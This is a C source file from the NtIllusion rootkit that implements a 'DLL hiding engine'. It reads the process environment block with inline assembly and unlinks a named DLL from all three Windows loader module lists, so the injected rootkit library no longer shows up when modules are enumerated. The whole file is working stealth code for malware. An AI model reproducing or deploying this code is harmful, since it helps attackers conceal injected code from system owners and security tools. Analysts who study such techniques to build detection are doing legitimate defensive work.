/******************************************************************************
  kDllHideEng.h : Dll hiding engine
  This is used to hide rootkit's dll among current process address space
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#include <windows.h>
#include "kDllHideEng.h"
#include "kPEBStruct.h"

int HideDll(char *szDllName)
{
	return (	WalkModuleList(LOAD_ORDER_TYPE, szDllName)
			&&	WalkModuleList(MEM_ORDER_TYPE, szDllName)
			&&	WalkModuleList(INIT_ORDER_TYPE, szDllName)	);
}

// Call GetPEB(0) to get PEB base address for current process
DWORD GetPEB(DWORD Pid)
{
	DWORD* dwPebBase = FUNC_ERROR;
	if(!Pid)
	{
		// Return PEB address for current process
		// address is located at FS:0x30
		__asm 
		{
			push eax
			mov eax, FS:[0x30]
			mov [dwPebBase], eax
			pop eax
		}
	}
/*	else
	{
		// Return PEB address for process whose pid matches Pid
		// Todo : use NtQueryInformationProcess
		//dwPebBase = ; ....
		
	}
*/
	return (DWORD)dwPebBase;
}

// Walks one of the three modules double linked lists referenced by the PEB
int WalkModuleList(char ModuleListType, char *szDllToStrip)
{
	int i;
	DWORD PebBaseAddr, dwOffset=0;
	PLIST_ENTRY pUserModuleListHead, pUserModuleListPtr;
	PPEB_LDR_DATA pLdrData;
	PUNICODE_STRING pImageName;
	char szImageName[BUFMAXLEN]; // Non-unicode string
	
	PebBaseAddr = GetPEB(0);
	if(PebBaseAddr == FUNC_ERROR)
		return FUNC_ERROR;
	pLdrData=(PPEB_LDR_DATA)(DWORD *)(*(DWORD *)(PebBaseAddr + PEB_LDR_DATA_OFFSET)); // PEB.ProcessModuleInfo = PEB + 0x0C
	if(!pLdrData->Initialized) 
		return FUNC_ERROR;

	// Init chained list head and offset
	if(ModuleListType == LOAD_ORDER_TYPE)
	{
		// LOAD_ORDER_TYPE
		pUserModuleListHead = pUserModuleListPtr = (PLIST_ENTRY)(&(pLdrData->ModuleListLoadOrder));
		dwOffset = 0x0;
	} else if(ModuleListType == MEM_ORDER_TYPE)
	{
		// MEM_ORDER_TYPE
		pUserModuleListHead = pUserModuleListPtr = (PLIST_ENTRY)(&(pLdrData->ModuleListMemoryOrder));
		dwOffset = 0x08;
	} else if(ModuleListType == INIT_ORDER_TYPE)
	{
		// INIT_ORDER_TYPE
		pUserModuleListHead = pUserModuleListPtr = (PLIST_ENTRY)(&(pLdrData->ModuleListInitOrder));
		dwOffset = 0x10;
	}
	else return FUNC_ERROR;
	
	do
	{
		// Jump to next MODULE_ITEM structure
		pUserModuleListPtr = pUserModuleListPtr->Flink;
		pImageName = (PUNICODE_STRING)( ((DWORD)(pUserModuleListPtr)) + (LDR_DATA_PATHFILENAME_OFFSET-dwOffset));

        //Convert string from unicode and to lower case :
		for(i=0; i < (pImageName->Length)/2 && i<BUFMAXLEN;i++) 
              szImageName[i] = LOWCASE(*( (pImageName->Buffer)+(i) ));
		szImageName[i] = '\0';
		// Image name may be sent to debugger here.

		if( strstr((char*)szImageName, szDllToStrip) != 0 )
		{
			// Hide this dll :
			// throw this module away (out of the double linked list)
           (pUserModuleListPtr->Blink)->Flink = (pUserModuleListPtr->Flink);
           (pUserModuleListPtr->Flink)->Blink = (pUserModuleListPtr->Blink);
		   // Here we may also overwrite memory to prevent recovering (paranoid only ;p)
		}
	}	while(pUserModuleListPtr->Flink != pUserModuleListHead); 

	return FUNC_SUCCESS;
}
